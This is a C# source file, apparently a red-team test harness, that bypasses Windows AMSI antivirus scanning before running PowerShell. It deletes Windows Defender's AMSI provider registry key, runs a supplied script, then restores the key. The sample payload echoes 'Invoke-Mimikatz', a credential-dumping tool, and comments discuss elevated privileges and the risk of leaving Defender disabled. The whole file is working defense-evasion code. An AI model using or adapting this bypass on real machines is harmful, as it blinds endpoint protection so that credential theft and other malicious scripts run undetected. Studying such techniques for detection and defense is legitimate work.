using System.Collections.ObjectModel;
using System.Management.Automation;

namespace PowershellBypassesTesting
{
    internal class Program
    {
    	/*** THIS TACTIC REQUIRES ELEVATED PRIVS (e.g. by UAC) ***/
    
        public static void Main(string[] args)
        {
            ExecuteMaliciousPowershellScript("echo \"Invoke-Mimikatz\"");
        }

        public static void ExecutePowershellScript(string payload)
        {
            using (PowerShell shell = PowerShell.Create())
            {
                shell.AddScript(payload);
                shell.Invoke();
            }
        }

        public static void ExecuteMaliciousPowershellScript(string payload)
        {
            // (?) make `ExecutePowershellScript` run in a sep. thread so AddWindowsDefenderAmsiToReg finishes? add time delay?
            // maybe. on one hand, WD might interfere with shell session. 
            // on other hand: AMSI prob. doesn't work that way, "once passed is passed."
            // + if process is killed early, windows defender will not be added back to amsi providers in reg!
            RemoveWindowsDefenderAmsiFromReg();
            ExecutePowershellScript(payload);
            AddWindowsDefenderAmsiToReg();
        }

        public static void AddWindowsDefenderAmsiToReg()
        {
        	// add the entry for windows defender back
            using (PowerShell shell = PowerShell.Create())
            {
                shell.AddScript("New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\"");
                shell.Invoke();
            }
        }

        public static void RemoveWindowsDefenderAmsiFromReg()
        {
        	// remove the entry for windows defender under the AMSI providers in the registry
            using (PowerShell shell = PowerShell.Create())
            {
                shell.AddScript("Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse");
                shell.Invoke();
            }
        }
    }
}

